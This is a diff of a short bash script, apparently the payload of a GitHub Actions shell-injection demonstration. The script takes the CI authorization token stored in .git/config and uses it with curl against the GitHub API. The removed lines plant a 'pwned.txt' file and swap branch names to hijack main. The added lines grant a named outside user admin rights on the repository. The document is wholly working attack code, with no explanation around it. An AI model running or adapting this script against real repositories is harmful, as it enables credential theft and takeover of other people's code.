@@ -1,27 +1,10 @@
 #!/usr/bin/env bash
 
 authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)
-
-
-
   
-# Inject content into the repo
+# Invite myself to repository
 curl --request PUT \
-  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt \
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/collaborators/minusworld \
   --header "Authorization: $authfield" \
   --header "Accept: application/vnd.github.v3+json" \
-  --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\", \"branch\": \"master\"}"
-
-# Rename main
-curl --request POST \
-  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/branches/main/rename \
-  --header "Authorization: $authfield" \
-  --header "Accept: application/vnd.github.v3+json"
-  --data '{"new_name": "blah"}'
-  
-# Rename my branch to main
-curl --request POST \
-  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/branches/master/rename \
-  --header "Authorization: $authfield" \
-  --header "Accept: application/vnd.github.v3+json"
-  --data '{"new_name": "main"}'
+  --data '{ "permission": "admin" }'
